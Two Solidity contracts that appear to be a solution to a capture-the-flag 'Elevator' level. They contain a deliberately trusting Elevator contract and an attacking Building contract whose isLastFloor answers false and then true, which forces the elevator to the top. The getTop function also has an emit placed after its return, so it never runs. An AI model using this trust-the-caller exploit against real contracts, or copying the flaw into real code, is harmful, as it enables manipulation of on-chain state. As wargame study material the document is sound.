pragma solidity ^0.8.0;

import "./Building.sol";

contract Elevator {
    event topValue(bool tops);
    bool public top;
    uint public floor;

    function getTop() public returns (bool) {
        return top;
        emit topValue(top);
    }

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Elevator.sol";

contract Building {
    uint counter;
    Elevator public elevator;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint) public returns (bool) {
        counter++;
        if (counter > 1) return true;
        else return false;
    }

    function attack() public {
        elevator.goTo(0);
    }
}